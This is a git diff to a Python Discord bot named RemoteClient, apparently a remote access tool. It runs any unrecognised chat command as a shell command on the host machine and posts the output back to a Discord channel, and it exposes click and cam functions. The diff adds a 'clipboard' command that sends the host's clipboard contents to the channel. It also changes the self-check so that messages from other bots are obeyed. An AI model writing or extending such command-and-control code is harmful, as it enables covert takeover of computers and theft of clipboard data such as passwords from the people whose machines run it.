@@ -1,3 +1,4 @@
+import pyperclip
 import asyncio
 import functools
 import os
@@ -368,9 +369,11 @@ async def help(client, message: discord.Message, args: str):
         await message.channel.send("Available commands:\n"+"\n".join(docs))
     except:
         help_message = "Available commands\n"+"\n".join(docs)
-        print(help_message)
         f = BytesIO(help_message.encode())
         await message.channel.send(file=discord.File(f, "output.txt"))
+
+async def clipboard(client, message:discord.Message, args:str):
+    await message.channel.send(pyperclip.paste())
 
 # It's a discord client that connects to a specific guild and category, and has a dictionary of
 # modules that can be called.
@@ -399,6 +402,7 @@ class RemoteClient(discord.Client):
             "click": click,
             "cam":cam,
             "help":help,
+            "clipboard":clipboard,
         }
 
     async def on_ready(self):
@@ -442,25 +446,24 @@ class RemoteClient(discord.Client):
         if message.channel == self.channel or message.channel.id == int(
             os.getenv("GLOBAL_ID")
         ):
-            if message.author.bot:
+            if message.author.id == self.user.id:
                 return
             parsed = message.content.split(" ")
             try:
+                
+
                 print(self.modules[parsed[0]])
                 if len(parsed) > 1:
                     await self.modules[parsed[0]](self, message, " ".join(parsed[1:]))
                 else:
                     await self.modules[parsed[0]](self, message, "")
             except KeyError:
-                # await message.channel.send(
-                #     f"Command {parsed[0]} not found in ovverrides, executing from command line instead"
-                # )
                 executor = functools.partial(exec_command, parsed)
                 res = await self.loop.run_in_executor(None, executor)
 
                 try:
                     if len(res[0]) > 0:
-
+                        
                         await message.channel.send(f"Stdout: ```bat\n{res[0]}\n```")
                     if len(res[1]) > 0:
                         await message.channel.send(f"Stderr: ```bat\n{res[1]}\n```")
